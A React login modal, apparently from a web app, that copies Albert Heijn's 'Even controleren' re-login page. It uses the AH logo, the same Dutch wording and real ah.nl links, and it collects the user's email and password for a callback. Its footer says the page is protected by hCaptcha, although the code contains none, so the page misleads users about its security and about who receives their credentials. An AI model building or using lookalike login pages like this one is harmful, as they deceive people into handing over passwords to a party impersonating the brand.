import { useState } from 'react'

/**
 * AH Login Modal - Mimics Albert Heijn's "Even controleren" login page
 * Opens as a popup/modal for users to enter their AH credentials
 */
export default function AHLoginForm({ isOpen, onClose, onSubmit, loading, error }) {
  const [email, setEmail] = useState('')
  const [password, setPassword] = useState('')
  const [showPassword, setShowPassword] = useState(false)

  if (!isOpen) return null

  const handleSubmit = (e) => {
    e.preventDefault()
    if (email && password) {
      onSubmit({ email, password })
    }
  }

  const handleOverlayClick = (e) => {
    if (e.target === e.currentTarget) {
      onClose()
    }
  }

  return (
    <div style={styles.overlay} onClick={handleOverlayClick}>
      <div style={styles.modal}>
        {/* AH Header Bar */}
        <div style={styles.header}>
          <button onClick={onClose} style={styles.backBtn}>
            ‹ Terug
          </button>
          <img src="/ah-logo.svg" alt="Albert Heijn" style={styles.logo} />
          <div style={styles.headerRight}></div>
        </div>

        {/* Login Card */}
        <div style={styles.card}>
          <h2 style={styles.title}>Even controleren</h2>
          <p style={styles.subtitle}>
            Om de gegevens in je account zo goed mogelijk te beschermen vragen we je opnieuw te laten weten wie je bent.
          </p>

          {error && (
            <div style={styles.error}>
              {error}
            </div>
          )}

          <form onSubmit={handleSubmit}>
            {/* Email Field */}
            <div style={styles.fieldGroup}>
              <label style={styles.label}>E-mailadres</label>
              <div style={styles.inputWrapper}>
                <input
                  type="email"
                  value={email}
                  onChange={(e) => setEmail(e.target.value)}
                  placeholder="jouwemail@voorbeeld.nl"
                  style={styles.input}
                  required
                  autoComplete="email"
                  autoFocus
                />
              </div>
            </div>

            {/* Password Field */}
            <div style={styles.fieldGroup}>
              <label style={styles.label}>Wachtwoord</label>
              <div style={styles.inputWrapper}>
                <input
                  type={showPassword ? 'text' : 'password'}
                  value={password}
                  onChange={(e) => setPassword(e.target.value)}
                  placeholder="••••••••••••••"
                  style={styles.input}
                  required
                  autoComplete="current-password"
                />
                <button
                  type="button"
                  onClick={() => setShowPassword(!showPassword)}
                  style={styles.showBtn}
                >
                  {showPassword ? 'Verberg' : 'Toon'}
                </button>
              </div>
            </div>

            {/* Submit Button */}
            <button
              type="submit"
              disabled={loading || !email || !password}
              style={{
                ...styles.submitBtn,
                opacity: loading || !email || !password ? 0.7 : 1,
                cursor: loading || !email || !password ? 'not-allowed' : 'pointer',
              }}
            >
              {loading ? 'Bezig met inloggen...' : 'Inloggen'}
            </button>

            {/* Forgot Password Link */}
            <a href="https://www.ah.nl/mijn/wachtwoord-vergeten" target="_blank" rel="noopener noreferrer" style={styles.forgotLink}>
              Inloggegevens vergeten?
            </a>

            {/* Privacy Link */}
            <a href="https://www.ah.nl/privacy" target="_blank" rel="noopener noreferrer" style={styles.privacyLink}>
              Hoe gebruiken we je gegevens?
            </a>
          </form>
        </div>

        {/* Footer */}
        <div style={styles.footer}>
          <p style={styles.footerText}>
            Deze pagina is beveiligd met hCaptcha, het{' '}
            <a href="https://www.hcaptcha.com/privacy" target="_blank" rel="noopener noreferrer" style={styles.footerLink}>
              Privacybeleid
            </a>{' '}
            en de{' '}
            <a href="https://www.hcaptcha.com/terms" target="_blank" rel="noopener noreferrer" style={styles.footerLink}>
              Servicevoorwaarden
            </a>{' '}
            van hCaptcha zijn van toepassing.
          </p>
        </div>
      </div>
    </div>
  )
}

const styles = {
  overlay: {
    position: 'fixed',
    top: 0,
    left: 0,
    right: 0,
    bottom: 0,
    backgroundColor: 'rgba(0, 0, 0, 0.6)',
    display: 'flex',
    alignItems: 'center',
    justifyContent: 'center',
    zIndex: 1000,
  },
  modal: {
    backgroundColor: '#f5f5f5',
    borderRadius: '0',
    width: '100%',
    maxWidth: '500px',
    maxHeight: '90vh',
    overflowY: 'auto',
    boxShadow: '0 10px 40px rgba(0,0,0,0.3)',
  },
  header: {
    display: 'flex',
    justifyContent: 'space-between',
    alignItems: 'center',
    padding: '0.75rem 1rem',
    backgroundColor: '#fff',
    borderBottom: '1px solid #e5e5e5',
  },
  backBtn: {
    background: 'none',
    border: 'none',
    color: '#00ADE6',
    fontSize: '1rem',
    cursor: 'pointer',
    padding: '0.25rem 0.5rem',
    fontWeight: 500,
  },
  logo: {
    width: '40px',
    height: '40px',
  },
  headerRight: {
    width: '60px', // Balance the header
  },
  card: {
    backgroundColor: 'white',
    margin: '2rem',
    padding: '2rem',
    borderRadius: '12px',
    boxShadow: '0 2px 8px rgba(0,0,0,0.08)',
  },
  title: {
    margin: '0 0 0.75rem 0',
    fontSize: '1.75rem',
    fontWeight: 700,
    color: '#333',
    textAlign: 'center',
  },
  subtitle: {
    margin: '0 0 1.5rem 0',
    fontSize: '0.95rem',
    color: '#666',
    textAlign: 'center',
    lineHeight: 1.5,
  },
  error: {
    backgroundColor: '#fee2e2',
    border: '1px solid #ef4444',
    borderRadius: '8px',
    padding: '0.75rem',
    marginBottom: '1rem',
    color: '#dc2626',
    fontSize: '0.875rem',
    textAlign: 'center',
  },
  fieldGroup: {
    marginBottom: '1rem',
  },
  label: {
    display: 'block',
    fontSize: '0.8rem',
    color: '#666',
    marginBottom: '0.25rem',
    paddingLeft: '0.5rem',
  },
  inputWrapper: {
    position: 'relative',
    border: '2px solid #e0e0e0',
    borderRadius: '8px',
    backgroundColor: '#fff',
    transition: 'border-color 0.2s',
  },
  input: {
    width: '100%',
    padding: '1rem',
    paddingRight: '4rem',
    border: 'none',
    borderRadius: '8px',
    fontSize: '1rem',
    boxSizing: 'border-box',
    backgroundColor: 'transparent',
    outline: 'none',
    color: '#333',
  },
  showBtn: {
    position: 'absolute',
    right: '0.75rem',
    top: '50%',
    transform: 'translateY(-50%)',
    background: 'none',
    border: 'none',
    color: '#00ADE6',
    cursor: 'pointer',
    fontSize: '0.9rem',
    fontWeight: 600,
  },
  submitBtn: {
    width: '100%',
    padding: '1rem',
    backgroundColor: '#00ADE6',
    color: 'white',
    border: 'none',
    borderRadius: '8px',
    fontSize: '1rem',
    fontWeight: 600,
    cursor: 'pointer',
    marginTop: '0.5rem',
    transition: 'background-color 0.2s',
  },
  forgotLink: {
    display: 'block',
    textAlign: 'center',
    marginTop: '1rem',
    color: '#00ADE6',
    textDecoration: 'none',
    fontSize: '0.95rem',
    fontWeight: 500,
  },
  footer: {
    padding: '1rem 2rem 2rem',
    textAlign: 'center',
  },
  footerText: {
    margin: 0,
    fontSize: '0.8rem',
    color: '#888',
    lineHeight: 1.5,
  },
  privacyLink: {
    display: 'block',
    textAlign: 'center',
    marginTop: '0.75rem',
    color: '#00ADE6',
    textDecoration: 'none',
    fontSize: '0.9rem',
  },
  footerLink: {
    color: '#00ADE6',
    textDecoration: 'none',
  },
}
